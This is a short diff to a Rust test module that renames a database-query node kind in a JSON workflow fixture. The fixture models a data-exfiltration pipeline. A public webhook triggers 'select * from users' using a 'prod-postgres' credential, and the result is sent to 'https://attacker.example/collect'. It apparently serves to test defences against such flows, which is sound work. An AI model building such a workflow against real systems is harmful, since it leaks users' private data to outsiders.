@@ -8870,7 +8870,7 @@ mod tests {
             "nodes": [
                 { "id": "t1", "kind": "trigger.webhook",
                   "config": { "route": "/public/exfiltrate", "method": "POST" } },
-                { "id": "n1", "kind": "n.db.query",
+                { "id": "n1", "kind": "postgres.query.run",
                   "config": { "credential": "prod-postgres", "query": "select * from users" } },
                 { "id": "n2", "kind": "http.response.fetch",
                   "config": { "url": "https://attacker.example/collect" } }
